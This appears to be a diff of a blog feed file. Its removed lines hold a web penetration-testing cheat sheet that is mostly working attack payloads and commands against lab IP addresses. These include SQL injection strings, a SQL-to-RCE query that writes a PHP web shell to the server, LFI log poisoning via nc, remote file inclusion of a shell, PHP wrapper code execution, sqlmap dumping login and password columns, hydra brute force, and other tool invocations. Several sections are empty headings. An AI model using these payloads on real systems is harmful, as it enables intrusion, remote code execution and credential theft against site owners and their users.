-&lt;h3 id=&quot;bypass-addslashes&quot;&gt;Bypass Addslashes&lt;/h3&gt;
-&lt;p&gt;Send the string in char.&lt;/p&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;sql-injection-error-based&quot;&gt;SQL Injection Error based&lt;/h3&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,3,4,5 %25&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--Test until find the number of fields&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,version(),user(),database()&apos;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;blind-sql-injection&quot;&gt;Blind SQL Injection&lt;/h3&gt;
-&lt;p&gt;When we dont have error response.&lt;/p&gt;
-
-&lt;h3 id=&quot;blind-post-sqli&quot;&gt;Blind Post SQLi&lt;/h3&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and length(database()) = 7 &apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Will do request until to find the right lenght of database name&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and ascii(substring(database(),1,1)) = 100 #&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Will check character of the name until find all&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema=&quot;dbtest&quot;)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;time-based-sql-injection&quot;&gt;Time based SQL Injection&lt;/h3&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; or sleep(5)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- If sleep 6 sec is working the command. &lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- If was right the comparison will sleep.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;sql-to-rce&quot;&gt;SQL TO RCE&lt;/h3&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union all select 1,2,3,4,&quot;&amp;lt;?php system($_GET[&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;]);?&amp;gt;&quot; INTO OUTFILE &quot;/var/www/html/adm/banners/rce.php&quot; %23&apos;&lt;/span&gt; 
-
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;banners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifconfig&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;sqlmap&quot;&gt;SqlMap&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —current-db 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —dbs 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename —tables 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; tablename —columns 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;login,pass&apos;&lt;/span&gt; —dump 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —current-user 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —users 
-sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php&quot;&lt;/span&gt; —forms 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;xss-cross-site-scripting&quot;&gt;XSS Cross Site Scripting&lt;/h2&gt;
-&lt;p&gt;Links:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://brutelogic.com.br/blog/&quot;&gt;Brutelogic&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;reflect&quot;&gt;Reflect&lt;/h3&gt;
-
-&lt;h3 id=&quot;self-xss&quot;&gt;Self-XSS&lt;/h3&gt;
-&lt;p&gt;The script go to the page.&lt;/p&gt;
-
-&lt;h3 id=&quot;stored-xss&quot;&gt;Stored XSS&lt;/h3&gt;
-&lt;p&gt;When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc.&lt;/p&gt;
-
-&lt;h3 id=&quot;dom-xss&quot;&gt;Dom XSS&lt;/h3&gt;
-
-&lt;h3 id=&quot;automation&quot;&gt;Automation&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php?busca=&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Test parameters&lt;/span&gt;
-python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Find parameters in page&lt;/span&gt;
-python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php/&quot;&lt;/span&gt; —path &lt;span class=&quot;c&quot;&gt;# Search by self-xss&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;lfi-local-file-inclusion&quot;&gt;LFI Local File Inclusion&lt;/h2&gt;
-&lt;p&gt;Application receive a parameter that execeute a command direct, without handling the input.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;172.16.1.10/administration/info.php?p=/../../../../etc/passwd -&amp;gt; Read&lt;/li&gt;
-  &lt;li&gt;172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -&amp;gt; Null byte bypass.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;LFI to RCE - Log infection&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;172.16.1.10/administration/info.php?p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/../../../../var/log/apache2/access.log &lt;span class=&quot;c&quot;&gt;# Read a log file. in this case the apche log.&lt;/span&gt;
-
-nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 172.16.1.10 80 &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt; &lt;span class=&quot;c&quot;&gt;# Sending data to register in log&lt;/span&gt;
-
-172.16.1.10/administration/info.php?p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/../../../../var/log/apache2/access.log&amp;amp;p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;whereis nc &lt;span class=&quot;c&quot;&gt;# Execute the rce in log file.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;rfi--remote-file-inclusion&quot;&gt;RFI  Remote File Inclusion&lt;/h2&gt;
-&lt;p&gt;It’s possible to include a remote file in system.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&amp;amp;p=id&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;html-injection&quot;&gt;HTML Injection&lt;/h2&gt;
-&lt;p&gt;It’s possible inject a html in the page.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;“172.16.1.10/administration/search.php?ps=&lt;a href=&quot;http://172.90.0.37/&quot;&gt;&amp;lt;h1&amp;gt;Amazing link hacker&amp;lt;/h1&amp;gt;&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;path-traversal--directory-traversal&quot;&gt;Path Traversal | Directory Traversal&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;172.16.1.10/administration/test.php?banners=/ -&amp;gt; Will list all files inside the directory.&lt;/li&gt;
-  &lt;li&gt;172.16.1.10/administration/test.php?banners=/../ -&amp;gt; Will back one directory in path.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;command-injection&quot;&gt;Command injection&lt;/h2&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commix &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://172.16.1.10/hosting —data&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;site=whoami&quot;&lt;/span&gt; : 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;path-disclosure&quot;&gt;Path disclosure&lt;/h2&gt;
-&lt;p&gt;When we can see the application path.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;/var/www/html/adminstration/index.php&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;open-redirect&quot;&gt;Open redirect&lt;/h2&gt;
-&lt;p&gt;Is a redirect that allow to change the destination to our target.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;www.test.com/redirect.php?url=http://attacker.com&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;brute-force&quot;&gt;Brute force&lt;/h2&gt;
-&lt;p&gt;Hydra&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt 172.16.1.10 http-post-form &lt;span class=&quot;s2&quot;&gt;&quot;/adm/login.php:login=^USER^&amp;amp;PASS=^PASS^&amp;amp;Login:FAIL&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;source-code-analisys&quot;&gt;Source Code analisys&lt;/h2&gt;
-
-&lt;h2 id=&quot;php-wrappers&quot;&gt;PHP wrappers&lt;/h2&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://test.com/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;,hash 
-
-http://test.com/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;cms&quot;&gt;CMS&lt;/h2&gt;
-&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://wpvulndb.com&quot;&gt;wpvulndb.com&lt;/a&gt;: Vulnetabilities database&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan —url http://test.com/blog —api-token token
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;joomla&quot;&gt;JOOMLA&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joomscan &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://172.100.0.106
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;webdav&quot;&gt;Webdav&lt;/h2&gt;
-&lt;p&gt;Is a set of extensions for the HTTP.&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cadaver http://172.16.1.10/webdav/ &lt;span class=&quot;c&quot;&gt;# Open a connection to execute commands&lt;/span&gt;
-
-davtest &lt;span class=&quot;nt&quot;&gt;-url&lt;/span&gt; http://172.16.1.10/webdav/ &lt;span class=&quot;c&quot;&gt;# Upload files and execute it.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;xxe&quot;&gt;XXE&lt;/h2&gt;
-
-&lt;h2 id=&quot;ssrf&quot;&gt;SSRF&lt;/h2&gt;
-&lt;h2 id=&quot;csrf&quot;&gt;CSRF&lt;/h2&gt;
-&lt;h2 id=&quot;template-injection&quot;&gt;Template injection&lt;/h2&gt;
-&lt;h2 id=&quot;subdomain-takeover&quot;&gt;Subdomain Takeover&lt;/h2&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="web" /><category term="pentesting" /><summary type="html">This is a guide for Web pentesting</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="post-exploitation" /><category term="exploitation" /><summary type="html">This is a guide for post exploitation</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
